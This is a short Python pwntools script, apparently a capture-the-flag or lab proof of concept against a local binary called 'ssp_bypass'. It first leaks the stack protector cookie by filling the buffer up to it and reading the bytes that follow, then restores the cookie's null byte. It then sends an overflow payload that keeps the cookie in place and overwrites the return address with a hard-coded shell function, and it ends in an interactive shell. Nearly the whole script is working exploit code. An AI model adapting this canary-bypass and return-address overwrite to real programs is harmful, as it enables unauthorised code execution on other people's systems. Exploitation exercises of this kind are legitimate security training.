#!/usr/bin/python3

from pwn import *
import struct
import sys


# PART 1 - Cookie Leakage
try:
    n_of_A = int(sys.argv[1])
    
    exploit = process("./ssp_bypass")          # run the program
    exploit.recvuntil("Hello Hacker!")         # receive until the program greets us
 
    payload = "A" * n_of_A                     # Payload creation
    exploit.sendline(payload)                  # send A's to the program
    reply = exploit.recvuntil("A"*n_of_A)      # receive until the program finished to print back our input
    log.info(reply)

    try:
        cookie = u32(exploit.recv(4))           # receive 4 more bytes after the A to get the cookie val
        log_info  = "Cookie with newline: "     
        log_info += hex(cookie)
        log.info(log_info)                      # log the cookie with the newline char

        cookie_original = cookie - 0x0a         # put back in place the null byte instead of the newline char (0x0a)

        log_info  = "Cookie original val: "
        log_info += hex(cookie_original)
        log.info(log_info)                      # log the original cookie

    except struct.error as e:
        print("[-] " + str(e))

    # SECOND PART - Buffer Overflow
    pwn_function = p32(0x08049256)              # shell function

    payload  = b"A" * 100                       # bytes because p32() will be bytes
    payload += p32(cookie_original)
    payload += b"B" * 12
    payload += pwn_function
    log.info("Sending payload: " + str(payload))

    exploit.send(payload)
    exploit.recv ()
    exploit.interactive ()

except IndexError:
    print("Usage: ssp_poc.py <number_of_A>")
